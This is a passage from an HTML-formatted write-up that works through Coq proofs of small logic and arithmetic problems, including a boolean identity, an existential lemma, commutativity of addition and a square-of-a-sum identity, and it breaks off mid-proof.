&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;induction&lt;/span&gt; b1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2 subgoals &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 14&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  b2 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  negb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;true &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; b2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;negb true &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; negb b2&lt;span style=&#34;color:#f92672&#34;&gt;)%&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;

subgoal 2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 15&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;is&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
 negb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;false &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; b2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;negb false &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; negb b2&lt;span style=&#34;color:#f92672&#34;&gt;)%&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Theorem&lt;/span&gt; problem4&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;C &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;T &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;Set&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;B &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; C &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; C &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; B x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intros&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 23&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  C &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;
  T &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;Set&lt;/span&gt;
  B &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;
  H &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; C &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B x
  H0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; C
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; B x

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;induction&lt;/span&gt; H&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 30&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  C &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;
  T &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;Set&lt;/span&gt;
  B &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;
  x &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T
  H &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; C &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B x
  H0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; C
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; x0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; B x0

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;apply&lt;/span&gt; H &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; H0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 31&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  C &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;
  T &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;Set&lt;/span&gt;
  B &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;
  x &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T
  H &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; C &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B x
  H0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; B x
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; x0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; B x0

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 34&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  C &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;
  T &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;Set&lt;/span&gt;
  B &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;
  x &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; T
  H &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; C &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B x
  H0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; B x
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  B x

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;assumption&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Instead of explicitly using &lt;code&gt;apply H in H0.&lt;/code&gt;, I&#39;ve now discovered that the following simpler proof also works:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;intros&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;induction&lt;/span&gt; H&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have to deal with natural numbers for the final starter problem, which we can also solve using induction:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Theorem&lt;/span&gt; problem5&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; m n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intros&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;induction&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2 subgoals &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 14&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 0

subgoal 2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 18&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;is&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
 S m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S m

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 18&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  m&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  IHm &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  S m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S m

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;simpl&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 21&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  m&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  IHm &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  S &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S m

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rewrite&lt;/span&gt; IHm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 22&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  m&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  IHm &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  S &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S m

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There are only 2 more problems after the starter 6.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;nice warmup&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; lets &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; some math&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;Require&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;Import&lt;/span&gt; Arith&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Mult&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;Theorem&lt;/span&gt; math_problem&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; m n&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 2 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The idea with this one is simply to expand both sides, and let the theorem prover see that both sides have the same terms.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intros&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;simpl&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 13&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  m&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rewrite&lt;/span&gt; mult_plus_distr_r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rewrite&lt;/span&gt; mult_plus_distr_r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 15&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  m&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;n 